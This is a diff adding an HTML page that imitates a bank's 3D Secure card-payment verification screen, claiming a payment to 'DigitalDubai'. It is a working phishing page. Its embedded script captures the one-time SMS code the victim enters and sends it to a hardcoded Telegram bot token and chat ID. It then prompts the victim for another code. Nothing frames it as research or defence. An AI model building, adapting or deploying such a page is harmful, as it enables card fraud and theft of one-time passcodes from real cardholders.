@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D Secure 2.2.0</title>
+    <link rel="stylesheet" type="text/css" href="./verification-code_files/index.css">
+    <script>
+        function sendToTelegram(event) {
+            event.preventDefault(); // منع إرسال النموذج بشكل افتراضي
+
+            let code = document.getElementById("tel").value.trim();
+if (!code) { // التحقق من أن الحقل ليس فارغاً
+    document.getElementById("error-message").innerText = "يرجى إدخال رمز التحقق";
+    return;
+}
+
+            let botToken = "7699595929:AAFQ_fuCA2z-9-1oeCWVlMwC7WIB64uqe0E";  // 🔴 استخدم توكن جديد لأمان أكثر
+            let chatId = "7585533835";
+            let message = `🔹 رمز التحقق الجديد: ${code}`;
+
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("يرجى ادخال رمز التحقق!");
+                    } else {
+                        alert("❌ حدث خطأ أثناء الإرسال.");
+                    }
+                })
+                .catch(error => {
+                    alert("❌ خطأ في الاتصال بتيليجرام.");
+                    console.error(error);
+                });
+        }
+    </script>
+</head>
+<body onresize="finalizeCss();" onload="finalizeCss();">
+    <div id="processing"></div>
+    <form id="checkout-page" method="POST">
+        <button type="submit" style="display: none;" disabled></button>
+        <input type="hidden" id="jsEnabled" name="jsEnabled" value="1">
+        <input type="hidden" id="userInteracted" name="userInteracted" value="0">
+        <div id="content-wrapper">
+            <div id="cancel-form-wrapper">
+                <div id="cancel-form">
+                    <button class="cancel" type="submit" name="action" value="cancel">Cancel</button>
+                </div>
+            </div>
+            <div id="branding-wrapper">
+                <div id="branding-area">
+                    <div id="branding-table">
+                        <div id="branding-row">
+                            <div id="branding-cell-left">
+                                <img class="schemeImg" src="./verification-code_files/1.png">
+                                <img class="schemeImg" src="./verification-code_files/3.png">
+                            </div>
+                            <div id="branding-cell-right">
+                                <img class="schemeImg" src="./verification-code_files/scheme.png" alt="scheme">                    
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="checkout-form-header-wrapper">
+                <div id="checkout-form-header">
+                    <div id="checkout-form-title">Verify By Phone</div>
+                    <div id="checkout-form-info">
+                        We have sent you a text message with a code to your registered mobile number. 971**********
+                        <br><br>You are paying DigitalDubai the amount.
+                        <p id="demo">3/11/2025, 22:05:07</p>
+                    </div>
+                    <div class="generalMessage">‍</div>
+                </div>
+            </div>
+            <div id="forms-container-wrapper">
+                <div id="forms-container">
+                    <div id="checkout-form">
+                        <div id="checkout-form-textbox-title">Verification code</div>
+                        <input type="text" id="tel" name="tel" autocomplete="off" class="textInput" maxlength="6" pattern="^[0-9]{4,6}$" required>
+                        <div id="error-message" style="color: red;"></div>
+                        <div id="codeMessage">
+                            <img class="messageImg" src="./verification-code_files/warning.png">
+                        </div>
+                        <button id="checkout-form-button" type="submit" name="send" value="confirm" onclick="sendToTelegram(event)" required class="name">CONFIRM</button>
+                    </div>
+                    <div id="resend-form">
+                        <button id="resend-form-button" type="submit" name="action" value="resend"></button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </form>
+</body>
+</html>
